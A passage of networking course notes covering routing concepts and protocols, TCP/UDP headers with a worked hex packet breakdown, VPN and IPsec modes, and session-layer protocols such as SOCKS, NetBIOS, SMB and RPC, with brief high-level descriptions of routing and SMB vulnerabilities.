192.168.0.0/16

These can be a range of IP addresses aggregated into a single, larger network address.

Commonly used as network summary routes     

Default route - A default route is a static route with the address 0.0.0.0/0 or ::.

Parent route is a level 1 network that is subnetted. A parent route will never be an ultimate route.

Level 2 child route are the subnets of a classful network address.



## Cisco Routing Table 
![image](https://github.com/user-attachments/assets/c65019b6-8231-4190-b043-2ad4e34000c9)

## Foundry Routing Table 
![image](https://github.com/user-attachments/assets/45676365-a85a-4fcf-bbe2-0e710b81d656)

## Juniper Routing Table 
![image](https://github.com/user-attachments/assets/96bbb988-fe7a-4e39-a889-ae3d30906860)

## Dell Routing Table
![image](https://github.com/user-attachments/assets/51d0e95c-bd12-470d-94bf-93ba1f255804)


## Primary Function

The primary functions of a router are to:

Determine the best path to send packets.

        Builds and maintains routing tables to make this determination.

        Uses directly connected networks, static routes, and dynamic routing protocols to assist in building and maintaining this routing table.

Forward packets toward their destination (this is called routing).

        Strips the Frame header off packet from incoming interface.

        Adds new Frame header to packet for outgoing interface.


## Best Match


Best Route = Longest Match

    Routers compare the destination address in the incoming packet to its entries in the routing table. It matches the address (bit by bit) to all the table entries and looks for the longest bit match it can find. Starting at the far left, it compares the bits up to the amounts of bits in the CIDR mask. (i.e. a /12 mask will match 12 bits and a /24 will match 24 bits.)

    Since the IP packet only contains the IP address and not the subnetmask, the router does not know what network the address belongs to. So this matching process tries to narrow down the address to a list of "known" networks.

    Once a route with the most matched bits is found, it will forward the packet to the next-hop ip address in the table entry and re-encapsulate the packet into a new frame appropriate for the exiting interface.


![image](https://github.com/user-attachments/assets/28055412-1be1-490b-8ed0-8d26222b6696)


## Administrative Distance 



Routers uses an AD to determine the best source route to install into the IP routing table. The AD represents the "trustworthiness" of the route; the lower the AD, the more trustworthy the route source.

For example, if a router learned about the 10.0.0.0/24 from EIGRP, OSPF and RIP, the EIGRP route entry would be in installed into the routing table. This is because EIGRP AD 90 is lower than OSPF AD 110 and RIP AD 120.

If anything should happen with the EIGRP route then the OSPF route is installed into the routing table.


![image](https://github.com/user-attachments/assets/93d8a30e-3463-4fce-a225-34400da624fd)

## Metric 



Some of the most common metrics that routing protocols can use are:

hop

bandwidth

delay

reliability

load

MTU

cost

administratively defined

## Routing Protocol with Metric Name 

RIP
Hop count

EIGRP
Bandwidth, Delay, Load, Reliability

OSPF
Cost (Bandwidth)

IS-IS
Cost (Assigned by Admin)

BGP
Policy assigned by Admin


## Classful and Classless
![image](https://github.com/user-attachments/assets/53377155-125a-40cd-99ff-5acdd1099409)


Routing protocols are either Classful or Classless.

Classful routing protocols (RIPv1 and IGRP) do not send subnet mask information with their routing updates.

Classless routing protocols (RIPv2, EIGRP, OSPF, and IS-IS) support VLSM and CIDR which include the subnet mask information in their routing updates; classful protocols do not.

IPv6 routing protocols are all considered classless.



## Routing vs Routed Protocols
![image](https://github.com/user-attachments/assets/8146ac06-01df-4b34-939f-dfa3d0614708)



Routed protocols allows data to be routed. These protocols provide an addressing scheme and sub-netting. The addressing scheme identifies the individual host and the network to which it belongs. Each host address must be unique. All hosts on an internetwork must use the services of a routed protocol to communicate.

IPv4

IPv6

IPX

AppleTalk

Routing Protocols are used by routers to communicate routing information with each other. Unless all routes are manually entered into the router, the router needs to learn from other routers about the networks that they know. They use this shared information to populate their routing tables so that they can make better decisions when forwarding routed protocols such as IPv4.

Routing protocols are broken down to 2 types:

Interior Gateway Protocol (IGP) - is a type of protocol used for exchanging routing information between gateways (commonly routers) within an autonomous system

RIP (v1, v2, ng)

EIGRP and EIGRP for IPv6

OSPF (v2 and v3)

IS-IS

Exterior Gateway Protocol (EGP) - is a routing protocol used to exchange routing information between autonomous systems

BGP

Not all routing protocols support all "routed" protocols. If you are running more than one then its possible that you may have to run additional routing protocols to ensure that those routes are advertised.


## IGP vs EGP
![image](https://github.com/user-attachments/assets/0c4ed8aa-6383-4fb6-b4b3-045b409a1927)



Interior Gateway Protocols (IGP):

Routing protocols that are used within an Autonomous System (AS).

Referred to as intra-AS routing.

Organizations and service providers IGPs on their internal networks.

IGPs include RIP, EIGRP, OSPF, and IS-IS.


Exterior Gateway Protocols (EGP):

Used primarily for routing between autonomous systems.

Referred to as inter-AS routing.

Service providers and large companies will interconnect their AS using an EGP.

The Border Gateway Protocol (BGP) is the only currently viable EGP and is the official routing protocol used by the Internet.





## Autonomous System 
![image](https://github.com/user-attachments/assets/51458c72-7eab-44dc-ad1c-2dba4b895414)


IANA Regional Internet Registries (RIR):

RIRs work in coordination with IANA to ensure the fair and efficient distribution of IP address resources globally. IANA allocates large blocks of IP addresses to the RIRs, and the RIRs, in turn, allocate smaller blocks of IP addresses to ISPs, organizations, and end-users within their respective regions. This hierarchical distribution system helps manage the limited pool of IPv4 addresses and ensure that IP address resources are allocated efficiently and fairly.

ARIN (American Registry for Internet Numbers):

Responsible for the allocation and management of IP addresses in North America, parts of the Caribbean, and sub-equatorial Africa.

RIPE NCC (Réseaux IP Européens Network Coordination Centre):

Responsible for the allocation and management of IP addresses in Europe, Central Asia, and the Middle East.

APNIC (Asia-Pacific Network Information Centre):

Responsible for the allocation and management of IP addresses in the Asia-Pacific region.

LACNIC (Latin America and Caribbean Network Information Centre):

Responsible for the allocation and management of IP addresses in Latin America and parts of the Caribbean.

AfriNIC (African Network Information Centre):

Responsible for the allocation and management of IP addresses in Africa.



Autonomous systems

An Autonomous System (AS) is a collection of IP networks and routers under the control of one entity (such as an Internet service provider, a university, or a large enterprise) that presents a common routing policy to the Internet.

Autonomous Systems are identified by unique numbers called Autonomous System Numbers (ASNs), which are assigned by regional Internet registries (RIRs) such as ARIN, RIPE NCC, APNIC, LACNIC, and AfriNIC.

Each administrative entity is assigned a 16-bit (prior to 2007) or 32-bit number (after 2007) to uniquely identify itself to everyone on the internet.


## Distance Vector Routing Protocol

![image](https://github.com/user-attachments/assets/e1dd32b3-2901-45e0-bd0e-0c268c021dfa)



Distance Vector protocols are simplistic in their operation. They share entire routing tables with their directly connected neighbors and from these shared tables they determine two factors:

Distance: This identifies how far away the destination network is from the router and is based on a metric such as the hop count, cost, bandwidth, delay, and more. It takes the learned distance from their neighbor, adds the distance to their neighbor, and this gives them a total distance.

Vector: This specifies the direction to the remote network. The router advertises a path that it has learned which allows access to a remote network via one of its interfaces.




There are four distance vector IPv4 IGPs:

RIPv1: First generation legacy protocol

RIPv2: Simple distance vector routing protocol

IGRP: First generation Cisco proprietary protocol (obsolete and replaced by EIGRP)

EIGRP: Advanced version of distance vector routing








## Link State Routing Protocols
![image](https://github.com/user-attachments/assets/7110c7d7-18dd-458e-af84-ff0151d7ddf2)



Compared to distance vector routing protocols, a router configured with a link-state routing protocol can create a complete view of the network. This is built by gathering information from all of the other routers to build a network topology.

Link state routing protocols tend to flood the network with Link State Advertisements (LSAs). Each router receives these updates and begins to build a map of the entire network. It will use its algorithms to compute the best routes from this map to all remote networks. After this is done no periodic updates are sent unless there is a change in the topology.



Link-state protocols work best in situations where:

The network design is hierarchical, usually occurring in large networks

Fast convergence of the network is crucial

The administrators have good knowledge of the implemented link-state routing protocol



There are two link-state IPv4 IGPs:

OSPF: Popular open standards-based routing protocol

IS-IS: Popular in service provider networks

![Screenshot 2024-07-24 at 14-07-40 NETWORK LAYER FG Cyber Common Technical Core - Networking Module](https://github.com/user-attachments/assets/5500104a-3fb5-41ab-b8bf-71dd5116b3eb)


## Routing Protocol Vulnerabilities


Distributed Denial of Service (DDOS) - Attackers send more packets to the router than they can handle or process. This will cause the router to drop packets if proper QoS is not implemented.

Packet Mistreating Attacks (PMA) - Similar to DOS attacks, packet mistreating injects packets with malicious codes designed to confuse and disrupt the router and network.

Routing Table Poisoning (RTP) - Attackers can send specially crafted routing protocol packets to the router to poison the router’s tables. Enabling authentication can help mitigate this attack.

Hit and Run DDOS (HAR) - DDOS attack on a specific network or router.

Persistent Attacks (PA) - similar to hit and run, in which they both look to inject frequent harmful data packages into the router and network, helping the hackers gain control. The attacker can redirect traffic as they want, send wrong routing updates, or simply delete the configuration of that router.




## Static Routing


![image](https://github.com/user-attachments/assets/4fb3d590-fbc7-4016-ab8d-f20e0dd6d126)




Static routing provides some advantages over dynamic routing, including:

Static routes do not advertise over the network, resulting in better security.

Static routes do not use bandwidth like dynamic routing protocols to send updates and no CPU cycles are used to calculate and communicate routes.

The path a static route uses to send data is predetermined.



Static routing has the following disadvantages:

Initial configuration and maintenance is time-consuming.

Configuration is prone to error, especially on large networks.

Administrator must intervene to update routing information or to bypass network faults.

Does not scale well with growing networks; maintenance becomes cumbersome.

Requires complete knowledge of the whole network for proper implementation.




## Dynamic Routing

![image](https://github.com/user-attachments/assets/c08ae744-0f17-449b-b634-85b6dfd4485d)





Routing protocols allow routers to dynamically exchange routing information to build routing tables. If 2 or more routers share the same protocol they can communicate with each other. The purpose of dynamic routing protocols includes:

Discover new remote networks

Maintaining current routing information

Choose best path to remote networks

Recalculate a new path to a remote network should the primary fail



Dynamic routing provides some advantages over static routing, including:

Easier to configure and maintain.

Administrator does not need to intervene to update tables during network outages.

Scales very well on growing networks.



Dynamic routing has the following disadvantages:

Routing protocols flood the network updates which consumes bandwidth and can be intercepted.

Uses extensive CPU and RAM to run its algorithms and build its databases.

Path data can travel is not deterministic and can change fluidly.




## Understand First Hop Redundancy Protocols and their vulnerabilities


![image](https://github.com/user-attachments/assets/b6b8fda5-7853-48ca-95e7-7b701ff7e7e2)




Redundancy on networks are critical should a fault occur. One limitation on user PCs is that you can only configure one default gateway. Should this device fail the users cannot get out of their local network. Even if 2 or more routers are configured for redundancy, each interface will have a different IP address and both cannot be configured on users. FHRP provides a mechanism to provide alternate default gateways in switched networks where two or more routers are connected to the same network.

FHRP works by assigning a virtual router to 2 or more gateway routers. This works by configuring a FHRP protocol on all participating gateway interfaces to share a "floating IP" address and MAC. Each interface will have its unique IP assigned to the interface but all will share this floating IP and MAC.


Several types of FHRPs were developed:

Hot Standby Router Protocol (HSRP)

A Cisco-proprietary FHRP designed to allow for transparent fail-over of IPv4 networks.

One router interface will be set as "active" and the others set as "standby".

Once the active interface will forward traffic to other networks.

Standby interfaces serve as backups in case the active fails.

Active interface sends multicast "Hello" packets to inform the backups that its still operational.



HSRP for IPv6 - Cisco-proprietary FHRP providing the same functionality as HSRP but for IPv6 addressing.



Virtual Router Redundancy Protocol version 2 (VRRPv2)

An industry-standard protocol defined in RFC 3768 that offers similar functionality to HSRP.

Like HSRP, VRRP allows multiple routers to work together to provide redundancy for the default gateway.

One router is elected as the master router, and the others are backup routers.

The master router sends periodic advertisements to inform the backup routers of its status.

If the master router fails, one of the backup routers is elected as the new master.



VRRPv3 - VRRP for IPv6 addressing.



Gateway Load Balancing Protocol (GLBP)

GLBP is another Cisco proprietary protocol that extends the functionality of HSRP and VRRP by providing load balancing in addition to redundancy.

GLBP allows multiple routers to share the traffic load for a virtual IP address, providing both redundancy and increased network capacity.

GLBP uses an active virtual gateway (AVG) to assign different virtual MAC addresses to different routers, distributing traffic across multiple gateways.

GLBP for IPv6 - CGLBP for IPv6 addressing.





## HSRP Attack:

Routers must exchange HSRP hello packets at the default interval of three seconds. Packets are sent using the multicast address of 224.0.0.2 (the "all routers" IPv4 multicast address). Since multicasts are flooded over the network similar to Broadcasts, they can be intercepted by any host with layer two connectivity and can inspect the HSRP parameters.

To usurp the active router, the attacker only needs to inject false HSRP hellos claiming the active role with a higher priority.




# Layer 4 Transport Layer
## Ports, Headers, Protocols 
TCP Transmission Control Protocol

UDP User Datagram Protocol

Port Ranges:
    Well Known 0-1023

    Registered 1024-49151

    Dynamic/ Private 49152-65535


## TCP and UDP
```


Connection-oriented (TCP-Segments-Unicast traffic)

    Requires that a connection with specific agreed-upon parameters be established before data is sent.

    Provides segmentation and sequencing.

    Provides connection establishment and acknowledgments to provide reliability.

    Provides flow control (or windowing).

    Common application layer protocols or functions that rely on TCP are SSH, Telnet, FTP, SMTP, POP, IMAP, and HTTP(s).

    Get more information in RFC 793


Connection-less (UDP-Datagrams-Broadcast, Multicast, Unicast Traffic)

    Requires no connection before data is sent.

    Provides no ordering, duplicate protection or delivery guarantee.

    Application layer protocols will normally provide the reliability if needed.

    Does provide integrity checking using the checksum.

    Common application layer protocols or functions that rely on UDP are DNS, TFTP, and QUIC (Quick UDP Internet Connections).

    Get more information in RFC 768



```

## TCP Header, States, and Flags


![image](https://github.com/user-attachments/assets/0780cf82-0bdf-42fa-94ee-77ed269900c8)

![image](https://github.com/user-attachments/assets/93c4b105-f741-4588-882a-4f433849b2a4)

![image](https://github.com/user-attachments/assets/a06eb908-6d4b-4aaf-b5c9-285156b99c35)

```


CWR: Congestion Windows Reduced - The congestion window reduced flag is used by the sending host to indicate it received a packet with the ECE flag set. (Not comonly used unless Explicit Congestion Notification (ECN) is used in the TCP header.)

ECE: Explicit Congestion Notification (ECN) Echo - This flag is responsible for indicating if the TCP peer is ECN capable. (Not comonly used unless Explicit Congestion Notification (ECN) is used in the TCP header.)

URG: Urgent - Indicates that the urgent pointer field is valid and contains urgent data. The urgent flag is used to notify the receiver to process the urgent packets before processing all other packets. Has become less relevant for modern TCP communications.

ACK: Acknowledgment - The acknowledgment flag is used to acknowledge the successful receipt of a packet.

PSH: Push - The push flag is somewhat similar to the URG flag and tells the receiver to process these packets as they are received instead of buffering them. This flag is only used during the established phase when sending data. Should be sent with an ACK flag.

RST: Reset - The reset flag gets sent from the receiver to the sender when a packet is sent to a particular host that was not expecting it. Most commonly used in response to a TCP connection on a closed port.

SYN: Synchronize - The synchronization flag is used as a first step in establishing a three way handshake between two hosts. Is only legitimately used during the 3-way handshake.

FIN: Finished - The finished flag means no more data from sender. Used as part of the 4-way TCP connection termination. Should be sent with an ACK flag.


```

![image](https://github.com/user-attachments/assets/cb8e261d-7fcd-4274-9cb0-1c755149a43c)

```


LISTEN - represents waiting for a connection request from any remote TCP and port.

SYN-SENT - represents waiting for a matching connection request after having sent a connection request.

SYN-RECEIVED - represents waiting for a confirming connection request acknowledgment after having both received and sent a connection request.

ESTABLISHED - represents an open connection, data received can be delivered to the user. The normal state for the data transfer phase of the connection.

FIN-WAIT-1 - represents waiting for a connection termination request from the remote TCP, or an acknowledgment of the connection termination request previously sent.

FIN-WAIT-2 - represents waiting for a connection termination request from the remote TCP.

CLOSE-WAIT - represents waiting for a connection termination request from the local user.

CLOSING - represents waiting for a connection termination request acknowledgment from the remote TCP.

LAST-ACK - represents waiting for an acknowledgment of the connection termination request previously sent to the remote TCP (which includes an acknowledgment of its connection termination request).

TIME-WAIT - represents waiting for enough time to pass to be sure the remote TCP received the acknowledgment of its connection termination request.

CLOSED - represents no connection state at all.

```



## UDP and Header

![image](https://github.com/user-attachments/assets/85c8e7c7-89ef-4ef6-adeb-058827139d13)

```
00 1f 29 5e 4d 26 00 50　56 bb 3a a0 08 00 45 00
00 3c 83 1b 40 00 40 11　15 0a c0 a8 14 46 4a 7d
83 1b dc de 00 35 00 36　7c 15 03 c4 01 20 00 01
00 00 00 00 00 01 04 6f　63 73 70 08 76 65 72 69
73 69 67 6e 03 6e 65 74　00 00 1c 00 01 00 00 29
10 00 00 00 00 00 00 00
```
```


    Ethernet Header:

        00 1f 29 5e 4d 26 is the destination MAC

        00 50 56 bb 3a a0 is the source MAC

        08 00 is the ethertype for IPv4

    IPv4 Header:

        45 to identify the Version is 4 and the IHL is 5 which means the IP header is 20 bytes in length. (IHL x 4)

        00 is the DSCP. Used for Quality of Service (QoS).

        00 3c is the Total length of 60 bytes. This includes the 20 byte header and 40 bytes of payload.

        83 1b is the Identification field. Value is 33563.

        40 00 is the Flags and fragmentation offset field. This value has the Dont Fragement (DF) turned on and no fragmentation offset.

            80 00 is the value for the Reserved (Evil bit).

            20 00 to 3F FF is the range for the More Fragements (MF) bit and fragmentation offset.

        40 is the Time to Live field. Currently set to 64.

        11 is the Protocol field. Currently set to identify UDP.

            01 is for ICMPv4

            06 is for TCP

        15 0a is the Checksum field

        c0 a8 14 46 is the source IP address. Currently set to 192.168.20.70.

        4a 7d 83 1b is the destination IP address. Currently set to 74.125.131.27.

    UDP Header:

        dc de is the source port field. Currently set to 56542.

        00 35 is the destination port field. Currently set to 53.

        00 36 is the length field. Currently set to 54 bytes. This includes 8 bytes of UDP header and 46 bytes of payload.

        7c 15 is the checksum field.

    Anything after this will be payload.


```


# Layer 5 Protocols and Headers
## Session Layer

## Virtual Private Networks

Virtual Private Networks (VPN) allows connections through a network that is not accessible to everyone else. This "private" connection makes is look like a direct connection, when in fact it is not. VPNs work by encapsulating an IP packet into another IP packet for traversal across a (generally) public network. The outer IP packet headers used for the traversal is then removed and the original packet headers are then used for further routing decisions.

![image](https://github.com/user-attachments/assets/2d69abba-00c7-4115-8efc-8101e4c76786)



VPN connections are typically unencrypted but can be secured using encryption, such as IPSEC or TLS/SSL, to make it more secure for sensitive information. Some protocols used to provide confidentiality for VPN tunnels.

IPsec: Provides a suite of protocols for secure IP communication, including Authentication Header (AH), Encapsulating Security Payload (ESP), and Internet Key Exchange (IKE).

SSL/TLS: Utilizes the SSL/TLS protocol suite to create secure connections between clients and servers, commonly used in SSL VPNs.

OpenVPN: An open-source VPN protocol that uses SSL/TLS for encryption and authentication, known for its flexibility and cross-platform compatibility.

## Types of VPNS

Remote Access VPN (Client to Site)
![image](https://github.com/user-attachments/assets/d87ee830-81aa-41dd-93d6-d47dbe783172)


Site to Site VPN (aka router to router VPN))
![image](https://github.com/user-attachments/assets/86af426c-b4b7-463c-b808-aa5b981338b2)


## L2TP TCP 1701


Layer Two Tunneling Protocol (L2TP) serves as an extension of the Point-to-Point Tunneling Protocol (PPTP) commonly employed by internet service providers (ISPs) to establish virtual private networks (VPNs). The primary objective of L2TP is to enable secure data transmission through the creation of tunnels. To uphold security and privacy standards, L2TP necessitates the use of an encryption protocol within the established tunnel.

L2TP exhibits the capability to transport a diverse range of Layer 2 (L2) data types across an Internet Protocol (IP) or Layer Three (L3) network. The initiation of this process involves the establishment of a tunnel connecting an L2TP Access Concentrator (LAC) and an L2TP Network Server (LNS) on the internet. This configuration facilitates the implementation of a Point-to-Point Protocol (PPP) link layer, which is encapsulated and seamlessly transferred across the internet for secure and efficient communication.


## PPTP 1723



Point-to-Point Tunneling Protocol (PPTP) stands as a foundational networking protocol that empowers the secure deployment of Virtual Private Networks (VPNs) over the Internet. Conceived by Microsoft and collaborative contributors, PPTP is intricately designed to forge a private and encrypted communication conduit between clients and servers, guaranteeing the secure transmission of data.

Authentication Mechanisms: PPTP boasts support for a range of robust authentication mechanisms, including Password Authentication Protocol (PAP), Challenge Handshake Authentication Protocol (CHAP), and Microsoft CHAP (MS-CHAP). These mechanisms play a pivotal role in fortifying the verification processes, ensuring the genuine identity of the connecting parties.

Encapsulation and Encryption Expertise: PPTP demonstrates its prowess by encapsulating data within its proprietary packets, establishing a secure tunnel for data transmission. Furthermore, it incorporates encryption protocols such as Microsoft Point-to-Point Encryption (MPPE) to safeguard the confidentiality of the transmitted data. This dual-layered approach enhances the privacy and integrity of the communication channel.

Awareness of Limitations: Recognizing its historical prevalence, it’s crucial to acknowledge the limitations associated with PPTP. While it was widely adopted in the past, PPTP has exhibited security vulnerabilities, prompting a gradual decline in usage. Organizations and users have increasingly favored more secure VPN protocols like L2TP/IPsec and OpenVPN to address evolving security standards and ensure a higher level of data protection.

## IPSec



IPsec (Internet Protocol Security) is a suite of protocols used to secure IP communications by providing encryption, authentication, and integrity protection at the network layer (Layer 3) of the OSI model. It is widely used to establish Virtual Private Networks (VPNs) and secure data transmission over IP networks, including the internet.

Transport mode and Tunnel mode are two operational modes of IPsec (Internet Protocol Security) used to provide security for IP communications.



```
    Headers used by IPSec:

        ESP Header (Encapsulating Security Payload):

            Uses IP protocol number 50 to indicate IPSec with ESP Header payload.

            The Encapsulating Security Payload provides confidentiality, integrity, and optional authentication for IP packets.

            It encrypts the payload of IP packets to protect the confidentiality of the data being transmitted.

            The ESP header includes fields for the Security Parameters Index (SPI), sequence number, padding, authentication data (MAC), and other parameters.

            ESP can operate in either Transport mode (encrypts only the IP payload) or Tunnel mode (encrypts the entire IP packet).

            Performs integrity check only on ESP header and payload. Not the outer IP header.

            Does support protocols like NAT that alter the outer header.

            Modification or changes to the outer header does not affect ESP.

        AH Header (Authentication Header):

            Uses IP protocol number 51 to indicate IPSec with AH Header payload.

            The Authentication Header provides data integrity, authentication, and anti-replay protection for IP packets.

            It is used to ensure that the data received has not been altered or tampered with during transmission.

            The AH header includes fields for the Security Parameters Index (SPI), sequence number, authentication data (Message Authentication Code, MAC), and other parameters.

            AH can operate in either Transport mode (protects only the IP payload) or Tunnel mode (protects the entire IP packet).

            Performs integrity check on entire packet to include outer IP header.

            Integrity done only on immutable fields: Version, Length, Next Header/protocol, Source address, Destination address

            Mutable fields: DSCP/Traffic Class, Flow Label, TTL/Hop Limit

            Does not support protocols like NAT that alter the outer header.

            "mostly" obsolete

        IKE Header (Internet Key Exchange):

            IKE typically uses UDP port 500 for its main communication channel.

            IKEv2 may use UDP port 4500 for NAT traversal (UDP encapsulation) to overcome NAT (Network Address Translation) issues.

            IKE is used to establish Security Associations (SAs) and negotiate cryptographic parameters for IPsec.

            It operates at the application layer (Layer 7) and is used to exchange keying material, negotiate encryption and authentication algorithms, and authenticate IPsec peers.

            The IKE header includes fields for message type, exchange type, cryptographic algorithms, key exchange data, and other parameters.

            IKE is typically used in conjunction with IPsec to establish secure VPN connections.

```

## Transport MODE IPSec

![image](https://github.com/user-attachments/assets/1afbff8e-bd41-420e-b99c-0e00d1bfba64)

```


    Transport Mode:

        In Transport mode, IPsec only encrypts the payload (data) of the original IP packet, leaving the original IP header intact.

        Transport mode is typically used for end-to-end communication between two hosts or devices.

        When using Transport mode, only the data portion of the IP packet is protected by IPsec, while the original IP header, including the source and destination IP addresses, remains visible to intermediate devices.

        Transport mode is often used for scenarios where the communicating endpoints need to establish a secure connection while maintaining direct communication with each other.

        Example use cases for Transport mode include securing communication between individual hosts or devices within a private network or securing VoIP (Voice over IP) traffic between two endpoints.



```

## Tunnel Mode IPSec

![image](https://github.com/user-attachments/assets/ca699e76-595e-4529-b454-bb5aa9a376cd)

```


Tunnel Mode:

In Tunnel mode, IPsec encapsulates the entire original IP packet within a new IP packet, adding an additional IP header. Tunnel mode is commonly used to create secure VPN (Virtual Private Network) connections between networks or network devices, such as routers or firewalls.

When using Tunnel mode, the original IP packet, including its header and payload, is encrypted and encapsulated within a new IP packet.

The new IP header contains the IP addresses of the VPN gateway devices (tunnel endpoints), which are responsible for encrypting and decrypting the data as it passes through the VPN tunnel.

Tunnel mode provides network-level security, ensuring that all traffic between the VPN gateway devices is encrypted and protected from eavesdropping or tampering.

Example use cases for Tunnel mode include connecting branch offices to a central headquarters network over the internet, creating secure connections between remote users and a corporate network, or establishing site-to-site VPN connections between data centers.



```


## OpenVPN

```


OpenVPN is an open-source VPN (Virtual Private Network) software that provides secure communication over the internet by creating encrypted tunnels between devices or networks. It is widely used for remote access VPNs, site-to-site VPNs, and other secure networking applications.

OpenVPN requires special software that implements the OpenVPN protocol. There are client and server versions. The client software runs on your device (computer, phone, etc.) and the server software runs on the VPN provider’s server. This software creates the encrypted tunnel and manages the data transmission.

It’s known for being very secure due to strong encryption algorithms and multiple authentication methods. OpenVPN uses the OpenSSL library to provide encryption of both the data and control channels.

It offers a high degree of customization, making it suitable for a wide range of uses. Because of the customization options, setting up OpenVPN can be more complex for non-technical users compared to some other VPN solutions.

OpenVPN can be configured to use UDP or TCP as it’s transport layer protocols:

UDP Protocol (Default):

OpenVPN often uses UDP for communication, providing a lightweight and connectionless transport protocol suitable for VPNs.

The default UDP port number for OpenVPN is 1194.

TCP Protocol:

OpenVPN can also be configured to use TCP for communication, which can be useful in scenarios where UDP traffic is restricted or blocked.

The default TCP port number for OpenVPN is 1194, but it can be configured to use other port numbers such as port 443.



```


## Socks Protocol

```
    SOCKS (Socket Secure) is a protocol that facilitates communication between clients and servers through a proxy server.

        Initiates connections through a proxy

        Uses various Client / Server exchange messages

        Client can provide authentication to server

        Client can request connections from server

        Defined in RFC 1928

        Versions:

            SOCKS4

                Initial version of the SOCKS protocol, introduced in the early 1990s.

                No Authentication, meaning that it does not require clients to authenticate themselves before connecting to the proxy server.

                Only IPv4

                Only TCP support. No UDP support.

                No Proxy binding. Client’s IP is not relayed to destination.

            SOCKS5

                Support for Authentication, allowing clients to authenticate themselves using various methods, such as username/password, GSS-API (Generic Security Services Application Program Interface), or digital certificates.

                IPv4 and IPv6 support

                TCP and UDP support

                Supports Proxy binding. Client’s IP is relayed to destination.
```
![image](https://github.com/user-attachments/assets/f29f71a3-d8ec-4d0c-9a93-ac2f0e315682)



## NetBios Protocol
Network Basic Input/Output System



    NetBIOS, an acronym for Network Basic Input/Output System, emerged as a protocol suite crafted by IBM during the early 1980s. This suite offers a collection of services along with an application programming interface (API), facilitating network communication across local area networks (LANs). Initially conceived for IBM’s PC Network, NetBIOS eventually evolved into a de facto standard for LAN communication within the Microsoft Windows ecosystem.

    NetBIOS provides services related to the session layer of the OSI model allowing applications on separate computers to communicate over a local area network. The outputs from NetBIOS can provide computer names, group assignments, and MAC addresses of nodes.

    NetBIOS vs. DNS: The Domain Name System (DNS) is a directory for communication between devices over the internet. An internet connection is required to use DNS, but NetBIOS is available to all machines on a local area network. If a windows system is unable to resolve a name via DNS, then it will look for a WINS server, then finally uses NetBIOS.

For more indepth information NetBIOS

    Windows:

    nbtstat -A <IP Address>

Output will provide the NetBIOS Remote Machine Name Table which has Name, Type(group), and MAC Address.

    Linux:

    nbtscan -r <IP Address>




## SMB Protocol



SMB/CIFS (TCP 139/445 AND UDP 137/138)

    The Server Message Block (SMB) protocol serves as a communication protocol predominantly utilized by Microsoft Windows-equipped computers. Its primary function is to facilitate the sharing of files, printers, serial ports, and various communications among network nodes. For user authentication, SMB employs either the NTLM or Kerberos protocols.

    Additionally, SMB offers an authenticated inter-process communication (IPC) mechanism. Originally conceived in 1983 by Barry A. Feigenbaum at IBM, SMB aimed to provide shared access to files and printers within a network of systems running IBM’s OS/2.

    Subsequently, in 1987, Microsoft and 3Com implemented SMB in LAN Manager for OS/2. During this period, SMB utilized the NetBIOS service atop the NetBIOS Frames protocol as its foundational transport. Over time, Microsoft integrated SMB into Windows NT 3.1, continuously updating it to function with newer underlying transports, such as TCP/IP and NetBT. A notable development is the introduction of SMB over QUIC, which made its debut in Windows Server 2022.

![image](https://github.com/user-attachments/assets/73535f80-6390-4ed1-856a-5c8c39d4d802)

## SMB Vulnerabilities



Many vulnerabilities to SMB have been discovered since it was developed in 1984. Over the years, several vulnerabilities have been discovered in the SMB protocol that could potentially be exploited by attackers. Here are a few notable SMB protocol vulnerabilities:

    EternalBlue (CVE-2017-0144): EternalBlue is a vulnerability in the SMBv1 protocol that gained significant attention following its use in the WannaCry ransomware attack of 2017. It enabled remote code execution on Windows systems vulnerable to the exploit and quickly propagated through networks.

    Vulnerabilities in SMBv1: The SMBv1 protocol has been found to have multiple vulnerabilities, including flaws that allow remote code execution. It is recommended to disable SMBv1 due to its inherent security weaknesses.

    SMB Signing Downgrade (CVE-2017-0290): This vulnerability enables an attacker to downgrade the SMB signing negotiation process, potentially facilitating the interception and modification of SMB communications.

    SMB Relay Attack: SMB relay attacks exploit the authentication mechanism of SMB, allowing an attacker to relay user credentials and gain unauthorized access to network resources. This attack is particularly effective when SMB signing is disabled or weak.

    Denial of Service (DoS) Attacks: Various vulnerabilities in the SMB protocol have been discovered that could lead to denial of service attacks. By sending specially crafted requests, an attacker can overwhelm an SMB server, causing it to become unresponsive or crash.

    Man-in-the-Middle Attacks: In certain scenarios, attackers can intercept SMB traffic using a man-in-the-middle (MITM) position. This allows them to capture and manipulate sensitive data transmitted over the SMB protocol.

To mitigate these vulnerabilities, it is crucial to maintain up-to-date SMB implementations, disable older versions like SMBv1, enforce secure configurations (such as enabling SMB signing), and regularly apply security patches provided by vendors. Additionally, implementing network segmentation, strong authentication mechanisms, and monitoring systems can aid in detecting and preventing potential attacks targeting the SMB protocol.

Many organizations are moving away from SMB file and printer sharing and moving to cloud or enterprise based solutions.

Some alternatives to file storage:

    Enterprise Content Management (ECM) Systems

        Microsoft Sharepoint

        OpenText Content Suite

        IBM FileNet

    Cloud Storage Services

        Onedrive

        Google Drive

        Amazon S3

        Microsoft Azure Blob Storage

Some alternatives to printer sharing are:

    Printing directly to the printer

    Print Management Software

        PaperCut

        Equitrac

        Pharos

    Managed Print Services (MPS)

        Xerox

        HP

        Lexmark

        Ricoh

    Enterprise Output Management (EOM)

        HP Exstream

        OpenText Output Management

        ISIS Papyrus.

    Cloud-Based Printing Solutions

        Google Cloud Print

        PrinterLogic

    Mobile Printing Solutions ..HP ePrint

        Apple AirPrint




## RPC Remote Procedure Call 



RPC (Any Port)

    Remote Procedure Call (RPC) is a protocol that allows a program to request a service from another program located on the same system or on remote computer. It allows these programs to request services without having to understand details of the program. In essence, it standardizes the inter-communication with formalized requests for information. A procedure call is also sometimes known as a function call or a subroutine call.

    In essence, Remote Procedure Call (RPC) serves as a method for computer programs to communicate across a network as if they were in close proximity. This enables one program to ask another program on a different computer to perform a service or function. Picture it as requesting a favor from a friend, but in the realm of computers where programs work together to accomplish tasks. RPC simplifies the intricacies of communication, creating the illusion that the distant program is actually a local one. This approach finds extensive use in activities such as distributed computing and networked applications.

        RPC is a request/response protocol.

        RPC Wiki Reference

        User application will:

            Sends a request for information to a external server

            Receives the information from the external server

            Display collected data to User

        Examples of RPC are:

            SOAP - SOAP Example PCAP from Cloudshark

            XML

            JSON

            NFS




# Layer 6 
## Presentation Layer

```


    Presentation Layer - This layer deals with the Translating, Formatting, Encryption, and Compression of data.

        Data Translation and Transformation:

